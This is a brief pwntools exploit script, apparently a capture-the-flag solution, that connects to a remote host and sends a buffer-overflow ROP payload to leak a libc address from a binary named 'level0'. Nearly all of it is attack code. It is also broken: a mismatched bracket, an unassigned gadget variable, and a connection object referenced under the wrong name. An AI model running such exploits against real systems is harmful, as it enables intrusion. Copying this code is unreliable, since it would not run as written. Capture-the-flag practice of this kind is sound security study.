from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug']
io=remote('111.200.241.244',56058)
elf=ELF('./level0')
#r=process('./level0')
write_plt=elf.plt['write']
write_got=elf.got['write']
system_call=0x400596
pop_rdi_ret=0x0000000000400663
pop_rsi_ret=
ret_addr=0x400431
payload='A'*0x80+'B'*0x8+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(write_plt)+p64(1)+p64(write_got)+p64(8)
r.recvuntil('\n')
r.sendline(payload)
r.interactive()
